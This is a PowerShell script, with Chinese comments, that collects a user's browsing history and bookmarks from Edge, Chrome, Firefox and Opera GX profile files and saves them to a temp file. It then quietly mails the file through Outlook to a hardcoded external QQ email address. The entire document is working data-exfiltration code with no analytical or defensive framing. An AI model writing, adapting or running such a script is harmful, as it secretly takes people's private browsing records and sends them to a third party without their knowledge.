# 收集浏览器数据代码（保持不变）
function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,    
        [Parameter(Position=1, Mandatory=$True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }

    $Value = Get-Content -Path $Path -ErrorAction SilentlyContinue | 
             Select-String -AllMatches $Regex | 
             ForEach-Object { ($_.Matches).Value } | 
             Sort -Unique

    $Value | ForEach-Object {
        New-Object -TypeName PSObject -Property @{
            User     = $env:UserName
            Browser  = $Browser
            DataType = $DataType
            Data     = $_
        }
    } 
}

# 定义输出文件路径
$outputFile = "$env:TMP\--BrowserData.txt"

# 收集各浏览器数据并保存到文件中
Get-BrowserData -Browser "edge" -DataType "history"   >> $outputFile
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $outputFile
Get-BrowserData -Browser "chrome" -DataType "history"   >> $outputFile
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $outputFile
Get-BrowserData -Browser "firefox" -DataType "history"  >> $outputFile
Get-BrowserData -Browser "opera" -DataType "history"    >> $outputFile
Get-BrowserData -Browser "opera" -DataType "bookmarks"  >> $outputFile

# 使用 Outlook COM 对象发送邮件
try {
    # 创建 Outlook 应用对象
    $Outlook = New-Object -ComObject Outlook.Application
    $Mail = $Outlook.CreateItem(0)  # 0 表示邮件项

    $Mail.To = "1826859224@qq.com"
    $Mail.Subject = "Browser Data Report"
    $Mail.Body = Get-Content $outputFile | Out-String

    # 发送邮件
    $Mail.Send()
    Write-Output "邮件已成功"
} catch {
    Write-Error "发送邮件失败: $_"
}
